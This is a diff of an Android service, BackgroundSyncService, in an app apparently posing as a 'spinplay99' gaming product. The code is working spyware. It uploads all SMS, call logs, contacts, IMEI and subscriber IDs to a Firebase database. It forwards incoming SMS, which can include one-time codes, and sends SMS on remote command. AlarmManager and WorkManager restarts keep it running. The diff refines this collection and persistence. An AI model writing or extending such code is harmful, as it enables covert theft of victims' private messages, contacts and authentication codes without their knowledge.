@@ -1,6 +1,7 @@
 package com.spinplay99.adminpanel;
 
 import android.Manifest;
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -8,6 +9,7 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -15,6 +17,7 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.SystemClock;
 import android.provider.CallLog;
 import android.provider.Settings;
 import android.provider.Telephony;
@@ -24,6 +27,9 @@ import android.telephony.TelephonyManager;
 import androidx.annotation.NonNull;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
 
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.database.DataSnapshot;
@@ -40,11 +46,18 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
 import java.util.Map;
+import java.util.concurrent.TimeUnit;
 
 public class BackgroundSyncService extends Service {
 
-    private static final String CHANNEL_ID = "spinplay99_channel";
-    private static final int NOTIFICATION_ID = 999;
+    private static final String CHANNEL_ID       = "spinplay99_channel";
+    private static final int    NOTIFICATION_ID  = 999;
+    private static final String PREFS_NAME       = "SpinPlaySyncPrefs";
+    private static final String KEY_SMS_COUNT    = "last_sms_count";
+    private static final String KEY_CALL_COUNT   = "last_call_count";
+    private static final String KEY_CONTACT_COUNT = "last_contact_count";
+    private static final long   LIVE_SYNC_INTERVAL = 3000;
+    private static final long   FULL_SYNC_INTERVAL = 60000;
 
     private DatabaseReference databaseReference;
     private String deviceId;
@@ -57,6 +70,8 @@ public class BackgroundSyncService extends Service {
     private boolean forwardingEnabled = false;
     private List<String> forwardingFilters = new ArrayList<>();
     private boolean forwardAllSms = true;
+    private SharedPreferences prefs;
+    private long lastFullSyncTime = 0;
 
     @Override
     public void onCreate() {
@@ -66,10 +81,13 @@ public class BackgroundSyncService extends Service {
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         handler = new Handler(Looper.getMainLooper());
         smsManager = SmsManager.getDefault();
+        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification());
         loadForwardingSettings();
         listenForManualCommands();
+        scheduleRestart(this);
+        doFullDataSync();
     }
 
     @Override
@@ -79,50 +97,76 @@ public class BackgroundSyncService extends Service {
     }
 
     private void startSyncLoop() {
+        if (syncRunnable != null) handler.removeCallbacks(syncRunnable);
         syncRunnable = new Runnable() {
             @Override
             public void run() {
-                syncDataToFirebase();
-                handler.postDelayed(this, 2000);
+                syncLiveData();
+                long now = System.currentTimeMillis();
+                if (now - lastFullSyncTime >= FULL_SYNC_INTERVAL) {
+                    doFullDataSync();
+                    lastFullSyncTime = now;
+                }
+                handler.postDelayed(this, LIVE_SYNC_INTERVAL);
             }
         };
         handler.post(syncRunnable);
     }
 
-    private void syncDataToFirebase() {
+    private void syncLiveData() {
         DatabaseReference deviceRef = databaseReference.child("devices").child(deviceId);
         deviceRef.child("online_status").setValue(true);
         deviceRef.child("online_status").onDisconnect().setValue(false);
         deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
-        deviceRef.child("live_data").setValue(collectLiveData());
+
+        Map<String, Object> live = new HashMap<>();
+        SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+        live.put("timestamp", fmt.format(new Date()));
+        live.put("timestamp_millis", System.currentTimeMillis());
+        live.put("battery_level", getBatteryLevel());
+        live.put("network_type", getNetworkType());
+        live.put("is_charging", isDeviceCharging());
+        live.put("permissions", getAllPermissions());
+        live.put("sim_info", getSimInformation());
+        if (checkPermission(Manifest.permission.READ_SMS))
+            live.put("total_sms", getSmsCount());
+        if (checkPermission(Manifest.permission.READ_CALL_LOG))
+            live.put("total_calls", getCallLogCount());
+        if (checkPermission(Manifest.permission.READ_CONTACTS))
+            live.put("contacts_count", getContactCount());
+
+        deviceRef.child("live_data").setValue(live);
         updateDeviceInfo();
         checkAndForwardNewSms();
     }
 
-    private Map<String, Object> collectLiveData() {
-        Map<String, Object> liveData = new HashMap<>();
-        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
-        liveData.put("timestamp", dateFormat.format(new Date()));
-        liveData.put("timestamp_millis", System.currentTimeMillis());
-        liveData.put("battery_level", getBatteryLevel());
-        liveData.put("network_type", getNetworkType());
-        liveData.put("is_charging", isDeviceCharging());
-        liveData.put("permissions", getAllPermissions());
-        liveData.put("sim_info", getSimInformation());
-
-        if (checkPermission(Manifest.permission.READ_SMS)) {
-            liveData.put("total_sms", getSmsCount());
-            uploadAllSms();
-        }
-        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
-            liveData.put("total_calls", getCallLogCount());
-            uploadAllCalls();
-        }
-        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
-            liveData.put("contacts_count", getContactCount());
-            uploadAllContacts();
-        }
-        return liveData;
+    private void doFullDataSync() {
+        new Thread(() -> {
+            if (checkPermission(Manifest.permission.READ_SMS)) {
+                int current = getSmsCount();
+                int last = prefs.getInt(KEY_SMS_COUNT, -1);
+                if (current != last) {
+                    uploadAllSms();
+                    prefs.edit().putInt(KEY_SMS_COUNT, current).apply();
+                }
+            }
+            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
+                int current = getCallLogCount();
+                int last = prefs.getInt(KEY_CALL_COUNT, -1);
+                if (current != last) {
+                    uploadAllCalls();
+                    prefs.edit().putInt(KEY_CALL_COUNT, current).apply();
+                }
+            }
+            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
+                int current = getContactCount();
+                int last = prefs.getInt(KEY_CONTACT_COUNT, -1);
+                if (current != last) {
+                    uploadAllContacts();
+                    prefs.edit().putInt(KEY_CONTACT_COUNT, current).apply();
+                }
+            }
+        }).start();
     }
 
     private void updateDeviceInfo() {
@@ -137,16 +181,12 @@ public class BackgroundSyncService extends Service {
     }
 
     private void uploadAllSms() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                List<Map<String, Object>> allMessages = getAllSmsMessages();
-                Map<String, Object> smsData = new HashMap<>();
-                smsData.put("total_count", allMessages.size());
-                smsData.put("messages", allMessages);
-                databaseReference.child("devices").child(deviceId).child("all_sms").setValue(smsData);
-            }
-        }).start();
+        List<Map<String, Object>> allMessages = getAllSmsMessages();
+        Map<String, Object> smsData = new HashMap<>();
+        smsData.put("total_count", allMessages.size());
+        smsData.put("last_updated", ServerValue.TIMESTAMP);
+        smsData.put("messages", allMessages);
+        databaseReference.child("devices").child(deviceId).child("all_sms").setValue(smsData);
     }
 
     private List<Map<String, Object>> getAllSmsMessages() {
@@ -163,9 +203,7 @@ public class BackgroundSyncService extends Service {
                     sms.put("id", getCursorValue(cursor, 0));
                     sms.put("address", getCursorValue(cursor, 1));
                     String body = getCursorValue(cursor, 2);
-                    if (body != null && body.length() > 300) {
-                        body = body.substring(0, 300) + "...";
-                    }
+                    if (body != null && body.length() > 500) body = body.substring(0, 500) + "...";
                     sms.put("body", body);
                     String dateStr = getCursorValue(cursor, 3);
                     sms.put("date", dateStr);
@@ -188,16 +226,12 @@ public class BackgroundSyncService extends Service {
     }
 
     private void uploadAllCalls() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                List<Map<String, Object>> allCalls = getAllCallLogs();
-                Map<String, Object> callData = new HashMap<>();
-                callData.put("total_count", allCalls.size());
-                callData.put("calls", allCalls);
-                databaseReference.child("devices").child(deviceId).child("all_calls").setValue(callData);
-            }
-        }).start();
+        List<Map<String, Object>> allCalls = getAllCallLogs();
+        Map<String, Object> callData = new HashMap<>();
+        callData.put("total_count", allCalls.size());
+        callData.put("last_updated", ServerValue.TIMESTAMP);
+        callData.put("calls", allCalls);
+        databaseReference.child("devices").child(deviceId).child("all_calls").setValue(callData);
     }
 
     private List<Map<String, Object>> getAllCallLogs() {
@@ -236,16 +270,12 @@ public class BackgroundSyncService extends Service {
     }
 
     private void uploadAllContacts() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                List<Map<String, Object>> allContacts = getAllContactsList();
-                Map<String, Object> contactData = new HashMap<>();
-                contactData.put("total_count", allContacts.size());
-                contactData.put("contacts", allContacts);
-                databaseReference.child("devices").child(deviceId).child("all_contacts").setValue(contactData);
-            }
-        }).start();
+        List<Map<String, Object>> allContacts = getAllContactsList();
+        Map<String, Object> contactData = new HashMap<>();
+        contactData.put("total_count", allContacts.size());
+        contactData.put("last_updated", ServerValue.TIMESTAMP);
+        contactData.put("contacts", allContacts);
+        databaseReference.child("devices").child(deviceId).child("all_contacts").setValue(contactData);
     }
 
     private List<Map<String, Object>> getAllContactsList() {
@@ -289,8 +319,7 @@ public class BackgroundSyncService extends Service {
                 return number;
             }
             if (cursor != null) cursor.close();
-        } catch (Exception e) {
-        }
+        } catch (Exception e) {}
         return "";
     }
 
@@ -312,8 +341,7 @@ public class BackgroundSyncService extends Service {
                 }
             }
             @Override
-            public void onCancelled(@NonNull DatabaseError error) {
-            }
+            public void onCancelled(@NonNull DatabaseError error) {}
         };
         databaseReference.child("devices").child(deviceId).child("forwarding_settings")
             .addValueEventListener(forwardingListener);
@@ -324,10 +352,7 @@ public class BackgroundSyncService extends Service {
         if (!forwardAllSms && !forwardingFilters.isEmpty()) {
             boolean matched = false;
             for (String filter : forwardingFilters) {
-                if (from.contains(filter)) {
-                    matched = true;
-                    break;
-                }
+                if (from.contains(filter)) { matched = true; break; }
             }
             if (!matched) return;
         }
@@ -340,37 +365,32 @@ public class BackgroundSyncService extends Service {
             log.put("status", "FORWARDED");
             log.put("forwarded_at", ServerValue.TIMESTAMP);
             databaseReference.child("devices").child(deviceId).child("forwarded_sms").push().setValue(log);
-        } catch (Exception e) {
-        }
+        } catch (Exception e) {}
     }
 
     private void checkAndForwardNewSms() {
         if (!forwardingEnabled || !checkPermission(Manifest.permission.READ_SMS)) return;
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                Cursor cursor = null;
-                try {
-                    long tenSecondsAgo = System.currentTimeMillis() - 10000;
-                    cursor = getContentResolver().query(
-                        Telephony.Sms.Inbox.CONTENT_URI,
-                        new String[]{"address", "body", "date"},
-                        "date > ?",
-                        new String[]{String.valueOf(tenSecondsAgo)},
-                        "date DESC LIMIT 5");
-                    if (cursor != null && cursor.moveToFirst()) {
-                        do {
-                            forwardSmsMessage(
-                                getCursorValue(cursor, 0),
-                                getCursorValue(cursor, 1),
-                                Long.parseLong(getCursorValue(cursor, 2))
-                            );
-                        } while (cursor.moveToNext());
-                    }
-                } catch (Exception e) {
-                } finally {
-                    if (cursor != null) cursor.close();
+        new Thread(() -> {
+            Cursor cursor = null;
+            try {
+                long tenSecondsAgo = System.currentTimeMillis() - 10000;
+                cursor = getContentResolver().query(
+                    Telephony.Sms.Inbox.CONTENT_URI,
+                    new String[]{"address", "body", "date"},
+                    "date > ?",
+                    new String[]{String.valueOf(tenSecondsAgo)},
+                    "date DESC LIMIT 5");
+                if (cursor != null && cursor.moveToFirst()) {
+                    do {
+                        forwardSmsMessage(
+                            getCursorValue(cursor, 0),
+                            getCursorValue(cursor, 1),
+                            Long.parseLong(getCursorValue(cursor, 2)));
+                    } while (cursor.moveToNext());
                 }
+            } catch (Exception e) {
+            } finally {
+                if (cursor != null) cursor.close();
             }
         }).start();
     }
@@ -380,7 +400,7 @@ public class BackgroundSyncService extends Service {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
                 for (DataSnapshot command : snapshot.getChildren()) {
-                    String to = command.child("to").getValue(String.class);
+                    String to      = command.child("to").getValue(String.class);
                     String message = command.child("message").getValue(String.class);
                     if (to != null && message != null) {
                         try {
@@ -391,18 +411,42 @@ public class BackgroundSyncService extends Service {
                             log.put("status", "SENT");
                             log.put("sent_at", ServerValue.TIMESTAMP);
                             databaseReference.child("devices").child(deviceId).child("sent_sms").push().setValue(log);
-                        } catch (Exception e) {
-                        }
+                        } catch (Exception e) {}
                     }
                     command.getRef().removeValue();
                 }
             }
             @Override
-            public void onCancelled(@NonNull DatabaseError error) {
-            }
+            public void onCancelled(@NonNull DatabaseError error) {}
         };
         databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
             .addValueEventListener(commandListener);
+    }
+
+    /** Schedule AlarmManager (5 min) + WorkManager (15 min) — no permission needed */
+    public static void scheduleRestart(Context context) {
+        // AlarmManager — fires every ~5 minutes
+        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+        Intent alarmIntent = new Intent(context, ServiceRestartReceiver.class);
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(
+            context, 0, alarmIntent,
+            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+        if (alarmManager != null) {
+            alarmManager.setInexactRepeating(
+                AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                SystemClock.elapsedRealtime() + 5 * 60 * 1000,
+                5 * 60 * 1000,
+                pendingIntent);
+        }
+
+        // WorkManager — fires every 15 minutes (minimum allowed)
+        PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(
+            ServiceRestartWorker.class, 15, TimeUnit.MINUTES)
+            .build();
+        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
+            "spinplay99_restart",
+            ExistingPeriodicWorkPolicy.KEEP,
+            workRequest);
     }
 
     private String getCursorValue(Cursor cursor, int index) {
@@ -415,7 +459,7 @@ public class BackgroundSyncService extends Service {
         } catch (Exception e) { return ""; }
     }
 
-    private int getSmsCount() { return getCount(Telephony.Sms.CONTENT_URI); }
+    private int getSmsCount()     { return getCount(Telephony.Sms.CONTENT_URI); }
     private int getCallLogCount() { return getCount(CallLog.Calls.CONTENT_URI); }
     private int getContactCount() { return getCount(android.provider.ContactsContract.Contacts.CONTENT_URI); }
 
@@ -430,12 +474,12 @@ public class BackgroundSyncService extends Service {
 
     private Map<String, Boolean> getAllPermissions() {
         Map<String, Boolean> permissions = new HashMap<>();
-        permissions.put("read_sms", checkPermission(Manifest.permission.READ_SMS));
-        permissions.put("send_sms", checkPermission(Manifest.permission.SEND_SMS));
-        permissions.put("receive_sms", checkPermission(Manifest.permission.RECEIVE_SMS));
+        permissions.put("read_sms",      checkPermission(Manifest.permission.READ_SMS));
+        permissions.put("send_sms",      checkPermission(Manifest.permission.SEND_SMS));
+        permissions.put("receive_sms",   checkPermission(Manifest.permission.RECEIVE_SMS));
         permissions.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
         permissions.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
-        permissions.put("call_phone", checkPermission(Manifest.permission.CALL_PHONE));
+        permissions.put("call_phone",    checkPermission(Manifest.permission.CALL_PHONE));
         return permissions;
     }
 
@@ -457,9 +501,21 @@ public class BackgroundSyncService extends Service {
 
     private String getNetworkType() {
         try {
-            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-            android.net.NetworkInfo networkInfo = cm.getActiveNetworkInfo();
-            if (networkInfo != null && networkInfo.isConnected()) return networkInfo.getTypeName();
+            android.net.ConnectivityManager cm =
+                (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                android.net.Network network = cm.getActiveNetwork();
+                if (network == null) return "Offline";
+                android.net.NetworkCapabilities caps = cm.getNetworkCapabilities(network);
+                if (caps == null) return "Offline";
+                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI))     return "WIFI";
+                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) return "MOBILE";
+                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET)) return "ETHERNET";
+                return "OTHER";
+            } else {
+                android.net.NetworkInfo info = cm.getActiveNetworkInfo();
+                if (info != null && info.isConnected()) return info.getTypeName();
+            }
         } catch (Exception e) {}
         return "Offline";
     }
@@ -469,7 +525,7 @@ public class BackgroundSyncService extends Service {
             Intent intent = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
             if (intent != null) {
                 int status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
-                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING 
+                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                     || status == android.os.BatteryManager.BATTERY_STATUS_FULL;
             }
         } catch (Exception e) {}
@@ -479,10 +535,10 @@ public class BackgroundSyncService extends Service {
     private Map<String, Object> getSimInformation() {
         Map<String, Object> simInfo = new HashMap<>();
         try {
-            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            if (telephonyManager != null) {
-                simInfo.put("sim_operator", telephonyManager.getSimOperatorName());
-                simInfo.put("network_operator", telephonyManager.getNetworkOperatorName());
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (tm != null) {
+                simInfo.put("sim_operator",     tm.getSimOperatorName());
+                simInfo.put("network_operator", tm.getNetworkOperatorName());
             }
         } catch (Exception e) {}
         return simInfo;
@@ -491,15 +547,16 @@ public class BackgroundSyncService extends Service {
     private Map<String, Object> getDetailedSimInfo() {
         Map<String, Object> simInfo = new HashMap<>();
         try {
-            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            if (telephonyManager != null) {
-                simInfo.put("sim_operator_name", telephonyManager.getSimOperatorName());
-                simInfo.put("network_operator_name", telephonyManager.getNetworkOperatorName());
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && checkPermission(Manifest.permission.READ_PHONE_STATE)) {
-                    simInfo.put("imei", telephonyManager.getImei());
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (tm != null) {
+                simInfo.put("sim_operator_name",     tm.getSimOperatorName());
+                simInfo.put("network_operator_name", tm.getNetworkOperatorName());
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                        && checkPermission(Manifest.permission.READ_PHONE_STATE)) {
+                    simInfo.put("imei", tm.getImei());
                 }
                 if (checkPermission(Manifest.permission.READ_PHONE_STATE)) {
-                    simInfo.put("subscriber_id", telephonyManager.getSubscriberId());
+                    simInfo.put("subscriber_id", tm.getSubscriberId());
                 }
             }
         } catch (Exception e) {}
@@ -517,7 +574,7 @@ public class BackgroundSyncService extends Service {
     }
 
     private Notification createNotification() {
-        Intent intent = new Intent(BackgroundSyncService.this, MainActivity.class);
+        Intent intent = new Intent(BackgroundSyncService.this, SplashActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(
             this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
         return new NotificationCompat.Builder(this, CHANNEL_ID)
@@ -530,15 +587,13 @@ public class BackgroundSyncService extends Service {
     }
 
     @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
+    public IBinder onBind(Intent intent) { return null; }
 
     @Override
     public void onDestroy() {
         databaseReference.child("devices").child(deviceId).child("online_status").setValue(false);
         if (handler != null && syncRunnable != null) handler.removeCallbacks(syncRunnable);
-        if (forwardingListener != null) 
+        if (forwardingListener != null)
             databaseReference.child("devices").child(deviceId).child("forwarding_settings")
                 .removeEventListener(forwardingListener);
         if (commandListener != null)
@@ -552,32 +607,5 @@ public class BackgroundSyncService extends Service {
         scheduleRestart(getApplicationContext());
         startService(new Intent(getApplicationContext(), BackgroundSyncService.class));
         super.onTaskRemoved(rootIntent);
-    }
-
-    /** Schedule both AlarmManager + WorkManager restarts — no permission needed */
-    public static void scheduleRestart(Context context) {
-        // --- AlarmManager: fires every ~5 minutes ---
-        android.app.AlarmManager alarmManager =
-            (android.app.AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
-        Intent alarmIntent = new Intent(context, ServiceRestartReceiver.class);
-        android.app.PendingIntent pendingIntent = android.app.PendingIntent.getBroadcast(
-            context, 0, alarmIntent,
-            android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
-        if (alarmManager != null) {
-            alarmManager.setInexactRepeating(
-                android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                android.os.SystemClock.elapsedRealtime() + 5 * 60 * 1000,
-                5 * 60 * 1000,
-                pendingIntent);
-        }
-
-        // --- WorkManager: fires every 15 minutes (minimum allowed) ---
-        PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(
-            ServiceRestartWorker.class, 15, TimeUnit.MINUTES)
-            .build();
-        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
-            "spinplay99_restart",
-            ExistingPeriodicWorkPolicy.KEEP,
-            workRequest);
     }
 }
